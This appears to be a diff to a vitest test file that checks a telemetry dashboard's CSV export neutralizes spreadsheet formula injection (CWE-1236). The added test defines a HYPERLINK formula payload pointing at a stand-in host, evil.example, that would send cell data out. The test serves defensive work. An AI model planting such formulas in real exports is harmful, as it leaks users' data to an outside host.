@@ -10,7 +10,7 @@
 
 import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import Database from 'better-sqlite3';
-import { mkdtempSync, rmSync } from 'fs';
+import { mkdtempSync, readFileSync, rmSync } from 'fs';
 import { tmpdir } from 'os';
 import { join } from 'path';
 import { TelemetryDashboard } from '../telemetry-dashboard';
@@ -113,5 +113,35 @@ describe('TelemetryDashboard data access (better-sqlite3)', () => {
     const d = new TelemetryDashboard();
     d.setDatabasePath(join(tmpDir, 'does-not-exist.db'));
     await expect(d.getAgentTelemetry()).resolves.toEqual([]);
+  });
+});
+
+describe('TelemetryDashboard CSV export', () => {
+  const PAYLOAD = '=HYPERLINK("https://evil.example/?"&A1,"click")';
+
+  it('neutralizes formula sigils in text fields (CWE-1236) and keeps quoting valid', async () => {
+    const csvDbPath = join(tmpDir, 'csv.db');
+    const db = new Database(csvDbPath);
+    db.prepare(SCHEMA).run();
+    db.prepare(
+      `INSERT INTO telemetry_sessions
+         (session_id, agent_type, task_type, description, start_time, status, model_used,
+          input_tokens, output_tokens, total_cost, duration)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
+    ).run('s9', '@agent', '-1+2', PAYLOAD, hoursAgo(1), 'success', '+model', 10, 5, 0.5, 100);
+    db.close();
+
+    const d = new TelemetryDashboard();
+    d.setDatabasePath(csvDbPath);
+    const out = join(tmpDir, 'export.csv');
+    await d.exportToCsv(out);
+
+    const row = readFileSync(out, 'utf-8').split('\n')[1];
+    // Text cells opening with a sigil gain a leading ' (the HYPERLINK cell stays
+    // RFC4180-quoted); the numeric token/cost/duration columns are untouched.
+    expect(row.startsWith(
+      `s9,'@agent,'-1+2,"'=HYPERLINK(""https://evil.example/?""&A1,""click"")",`
+    )).toBe(true);
+    expect(row.endsWith(`,success,'+model,10,5,0.5,100`)).toBe(true);
   });
 });
